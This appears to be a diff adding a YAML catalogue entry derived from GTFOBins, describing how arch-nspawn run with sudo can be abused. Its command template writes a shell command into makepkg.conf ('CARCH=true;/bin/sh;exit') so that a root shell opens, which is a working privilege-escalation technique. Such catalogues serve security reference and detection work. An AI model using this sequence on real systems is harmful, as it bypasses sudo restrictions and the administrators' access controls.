@@ -1,0 +1,32 @@
+id: gtfobins/arch-nspawn/shell/sudo
+type: binary
+platform: linux
+name: arch-nspawn
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'mkdir -p ./etc/
+
+    grep -oP "^CHROOT_VERSION=''\K[^'']+" /usr/share/devtools/lib/archroot.sh >.arch-chroot
+
+    touch ./etc/pacman.conf
+
+    echo ''CARCH=true;/bin/sh;exit'' >etc/makepkg.conf
+
+    arch-nspawn .'
+references:
+- https://gtfobins.github.io/gtfobins/arch-nspawn/
+tags:
+- linux
+- unix
+- gtfobins
